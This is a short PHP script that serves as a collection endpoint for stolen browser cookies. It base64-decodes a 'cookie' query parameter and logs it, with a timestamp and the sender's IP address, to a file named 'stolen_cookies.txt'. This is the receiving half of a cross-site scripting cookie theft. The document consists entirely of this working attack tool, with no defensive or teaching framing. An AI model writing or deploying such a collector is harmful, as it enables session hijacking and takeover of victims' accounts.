<?php
if (isset($_GET['cookie'])) {
    $cookie = base64_decode($_GET['cookie']);
    $log = "[Time: " . date('Y-m-d H:i:s') . "] IP: " . $_SERVER['REMOTE_ADDR'] . " | Cookie: " . $cookie . PHP_EOL;
    file_put_contents('stolen_cookies.txt', $log, FILE_APPEND);
}
?>
